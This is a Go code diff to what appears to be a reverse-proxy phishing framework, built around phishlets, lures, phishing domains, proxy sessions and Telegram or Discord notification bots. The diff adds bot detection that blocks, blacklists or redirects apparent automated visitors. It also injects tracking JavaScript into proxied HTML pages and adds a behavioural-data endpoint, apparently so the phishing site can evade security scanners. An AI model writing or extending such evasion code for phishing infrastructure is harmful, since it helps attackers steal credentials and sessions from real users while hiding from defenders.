@@ -78,6 +78,7 @@ type HttpProxy struct {
 	telegram_bot      *tgbotapi.BotAPI
 	telegram_chat_id  int64
 	discord_bot       api.WebhookClient
+    botDetectionManager *BotDetectionManager
 }
 
 type ProxySession struct {
@@ -144,7 +145,36 @@ func (p *HttpProxy) GetGeo(ip string) string {
 
 	return result.City + ", " + result.Region + ", " + result.Country + " (" + result.ISP + ")"
 }
+// EnableBotDetection enables bot detection
+func (p *HttpProxy) EnableBotDetection() {
+    if p.botDetectionManager != nil {
+        p.botDetectionManager.Enable()
+        log.Info("Bot detection enabled")
+    }
+}
 
+// DisableBotDetection disables bot detection
+func (p *HttpProxy) DisableBotDetection() {
+    if p.botDetectionManager != nil {
+        p.botDetectionManager.Disable()
+        log.Info("Bot detection disabled")
+    }
+}
+
+// GetBotDetectionStats returns bot detection statistics
+func (p *HttpProxy) GetBotDetectionStats() map[string]interface{} {
+    if p.botDetectionManager != nil {
+        return p.botDetectionManager.GetStats()
+    }
+    return map[string]interface{}{"enabled": false}
+}
+
+// cleanupBotDetection performs periodic cleanup
+func (p *HttpProxy) cleanupBotDetection() {
+    if p.botDetectionManager != nil {
+        p.botDetectionManager.CleanupExpiredSessions()
+    }
+}
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -162,7 +192,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		telegram_bot:      nil,
 		discord_bot:       nil,
 	}
-
+	
+    p.botDetectionManager = NewBotDetectionManager()
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
 		Handler:      p.Proxy,
@@ -208,6 +239,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+		// <<< START: PASTE BEHAVIORAL DATA ENDPOINT CODE HERE >>>
+		if req.URL.Path == "/behavioral-data" {
+		    // Handle behavioral data submission
+		    if p.botDetectionManager != nil {
+		        p.botDetectionManager.HandleBehavioralDataEndpoint(w, req)
+		        return // Important: return here to prevent further proxy processing
+		    }
+		}
+		// <<< END: PASTE BEHAVIORAL DATA ENDPOINT CODE HERE >>>
+
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
@@ -255,7 +296,39 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			parts := strings.SplitN(GetUserIP(nil, req), ":", 2)
 			remote_addr := parts[0]
-
+        // BOT DETECTION: Analyze request for bot patterns
+        if p.botDetectionManager.IsEnabled() {
+            // Create temporary session ID for initial analysis
+            tempSessionID := "temp_" + remote_addr + "_" + strconv.FormatInt(time.Now().Unix(), 10)
+            
+            // Perform bot detection analysis
+            botResult := p.botDetectionManager.AnalyzeRequest(req, nil, tempSessionID)
+            
+            // Handle bot detection result
+            if botResult.IsBot && botResult.BlockAction == "block" {
+                log.Warning("[BOT] Blocking request from %s - Confidence: %.2f, Reasons: %v", 
+                    remote_addr, botResult.Confidence, botResult.Reasons)
+                
+                // Add to blacklist if configured
+                if p.cfg.GetBlacklistMode() == "bot" || p.cfg.GetBlacklistMode() == "all" {
+                    err := p.bl.AddIP(from_ip)
+                    if err != nil {
+                        log.Error("failed to blacklist bot ip address: %s - %s", from_ip, err)
+                    } else {
+                        log.Warning("blacklisted bot ip address: %s", from_ip)
+                    }
+                }
+                
+                return p.blockRequest(req)
+            } else if botResult.BlockAction == "redirect" {
+                // Redirect suspicious traffic
+                resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+                if resp != nil {
+                    resp.Header.Add("Location", p.botDetectionManager.GetConfig().RedirectURL)
+                    return req, resp
+                }
+            }
+        }
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
 				pl := p.getPhishletByPhishHost(req.Host)
@@ -834,6 +907,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
+			    // Only inject JS for HTML responses in active sessions
+    if ps.SessionId != "" && resp.Header.Get("Content-Type") != "" {
+        contentType := resp.Header.Get("Content-Type")
+        if strings.Contains(contentType, "text/html") {
+            // Read response body
+            body, err := io.ReadAll(resp.Body)
+            if err == nil {
+                resp.Body.Close()
+                
+                // Inject behavioral detection JavaScript
+                if p.botDetectionManager.IsEnabled() {
+                    body = p.botDetectionManager.InjectBehavioralJS(ps.SessionId, body)
+                }
+                
+                // Create new response with modified body
+                resp.Body = io.NopCloser(bytes.NewBuffer(body))
+                resp.ContentLength = int64(len(body))
+                resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
+            }
+        }
+    }
+
 			if ps.SessionId != "" {
 				if ps.Created {
 					ck = &http.Cookie{
@@ -1746,6 +1841,17 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
+	go func() {
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				p.cleanupBotDetection()
+			}
+		}
+	}()
+
 	return nil
 }
 
